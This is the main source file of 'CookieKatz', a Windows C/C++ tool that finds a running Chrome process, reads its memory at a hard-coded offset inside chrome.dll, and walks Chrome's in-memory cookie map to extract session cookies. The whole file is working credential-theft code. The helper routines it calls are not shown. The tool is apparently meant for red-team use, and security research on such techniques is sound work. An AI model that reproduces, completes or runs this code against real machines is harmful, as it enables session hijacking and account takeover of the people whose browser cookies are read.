#include <stdio.h>
#include <Windows.h>

#include "Helper.h"
#include "Process.h"
#include "Memory.h"

void banner() { //This is important
    printf(" _____             _    _      _   __      _       \n");
    printf("/  __ \\           | |  (_)    | | / /     | |      \n");
    printf("| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
    printf("| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
    printf("| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
    printf(" \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
    printf(" By Meckazin                    github.com / Meckazin \n");
};

int main() {
    banner();
	printf("CookieKatz!\n\n");

    DWORD pid = 0;
    HANDLE hChrome;
    if (!FindCorrectChromePID(&pid, &hChrome) || hChrome == NULL)
    {
        printf("[-] Failed to find right process\n");
        return 1;
    }

    wprintf(TEXT("[*] Targeting Chrome process PID: %d\n"), pid);

    uintptr_t baseAddress;
    if (!GetRemoteModuleBaseAddress(hChrome, TEXT("chrome.dll"), baseAddress))
    {
        printf("[-] Failed to find chrome.dll base address!\n");
        CloseHandle(hChrome);
        return 1;
    }
    DEBUG_PRINT(TEXT("[*] Found chrome.dll base address on 0x%p\n", (void*)baseAddress));

    const uintptr_t offset = 0xBC84B70;
    baseAddress += offset;

    DEBUG_PRINT(TEXT("[*] Trying to search for pattern 0x%p\n", (void*)baseAddress));

    const size_t patternSize = sizeof(uintptr_t);
    BYTE pattern[patternSize];
    ConvertToByteArray(baseAddress, pattern, patternSize);

    uintptr_t resultAddress = 0;

    if (!FindPattern(hChrome, pattern, sizeof(pattern), resultAddress)) {
        printf("[-] Failed to find the target pattern!\n");
        CloseHandle(hChrome);
        return 1;
    }

    DEBUG_PRINT(TEXT("[*] Pattern found at address 0x%p\n", (void*)resultAddress));

    uintptr_t CookieMapOffset = 0x28;
    CookieMapOffset += resultAddress + sizeof(uintptr_t); //Include the length of the result address as well

    DEBUG_PRINT(TEXT("[*] CookieMap should be found in address 0x%p\n", (void*)CookieMapOffset));

    WalkCookieMap(hChrome, CookieMapOffset);

    CloseHandle(hChrome);

    printf("[+] Done\n");
}